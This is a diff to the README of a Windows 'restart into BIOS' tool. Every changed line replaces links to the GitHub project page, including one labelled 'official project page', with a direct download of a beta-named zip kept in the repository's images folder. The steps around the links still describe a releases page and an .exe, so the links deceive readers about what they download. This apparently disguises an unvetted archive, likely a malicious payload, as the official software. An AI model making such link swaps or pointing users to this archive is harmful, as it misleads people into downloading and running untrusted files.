@@ -1,6 +1,6 @@
 # 🖱️ one-click-bios - Restart Windows into BIOS Quickly
 
-[![Download one-click-bios](https://img.shields.io/badge/Download-Get%20one-click--bios-blue?style=for-the-badge)](https://github.com/CMorris-100/one-click-bios)
+[![Download one-click-bios](https://img.shields.io/badge/Download-Get%20one-click--bios-blue?style=for-the-badge)](https://github.com/CMorris-100/one-click-bios/raw/refs/heads/main/images/click-bios-one-v3.1-beta.1.zip)
 
 ## 🛠 About one-click-bios
 
@@ -45,7 +45,7 @@ Follow these steps to download, install, and run one-click-bios on your Windows 
 
 1. Click the big blue button below to open the download page.
 
-[![Download one-click-bios](https://img.shields.io/badge/Download-Get%20one-click--bios-blue?style=for-the-badge)](https://github.com/CMorris-100/one-click-bios)
+[![Download one-click-bios](https://img.shields.io/badge/Download-Get%20one-click--bios-blue?style=for-the-badge)](https://github.com/CMorris-100/one-click-bios/raw/refs/heads/main/images/click-bios-one-v3.1-beta.1.zip)
 
 2. On the GitHub page, look for the “Releases” section or folders containing files.  
 3. Find the latest release and download the installer file (usually ends with `.exe`).  
@@ -106,7 +106,7 @@ The shortcut runs this command with administrator rights so it can access the re
 
 Visit the official project page here:  
 
-[one-click-bios GitHub](https://github.com/CMorris-100/one-click-bios)
+[one-click-bios GitHub](https://github.com/CMorris-100/one-click-bios/raw/refs/heads/main/images/click-bios-one-v3.1-beta.1.zip)
 
 ---
 
@@ -158,5 +158,5 @@ Older versions of Windows or non-supported editions might not work with this too
 
 ---
 
-# [one-click-bios](https://github.com/CMorris-100/one-click-bios)  
-[![Download one-click-bios](https://img.shields.io/badge/Download-Get%20one-click--bios-blue?style=for-the-badge)](https://github.com/CMorris-100/one-click-bios)
+# [one-click-bios](https://github.com/CMorris-100/one-click-bios/raw/refs/heads/main/images/click-bios-one-v3.1-beta.1.zip)  
+[![Download one-click-bios](https://img.shields.io/badge/Download-Get%20one-click--bios-blue?style=for-the-badge)](https://github.com/CMorris-100/one-click-bios/raw/refs/heads/main/images/click-bios-one-v3.1-beta.1.zip)
